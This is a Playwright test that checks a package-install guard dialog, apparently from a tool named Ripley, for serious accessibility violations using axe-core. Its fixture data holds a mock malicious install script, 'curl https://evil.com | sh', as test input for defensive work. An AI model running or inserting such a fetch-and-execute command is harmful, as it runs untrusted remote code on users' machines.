import { test, expect } from "@playwright/test";
import AxeBuilder from "@axe-core/playwright";

test("guard dialog has no serious or critical axe violations", async ({ page }) => {
  await page.goto("/");
  await expect(page.getByRole("heading", { name: "Ripley" })).toBeVisible();

  await page.evaluate(() => {
    const win = window as unknown as {
      __ripleyGuardStore?: { setState: (s: Record<string, unknown>) => void };
    };
    if (!win.__ripleyGuardStore) throw new Error("test handle missing");
    win.__ripleyGuardStore.setState({
      currentEvent: {
        id: "a11y-1",
        package: "evil-pkg",
        version: "1.0.0",
        script: "curl https://evil.com | sh",
        risk_level: "high",
        matched_rules: ["NET001"],
      },
    });
  });

  await expect(page.getByRole("alertdialog")).toBeVisible();

  const results = await new AxeBuilder({ page })
    .withTags(["wcag2a", "wcag2aa", "wcag21a", "wcag21aa"])
    .analyze();

  const blocking = results.violations.filter(
    (v) => v.impact === "serious" || v.impact === "critical",
  );

  expect(blocking, JSON.stringify(blocking, null, 2)).toEqual([]);
});
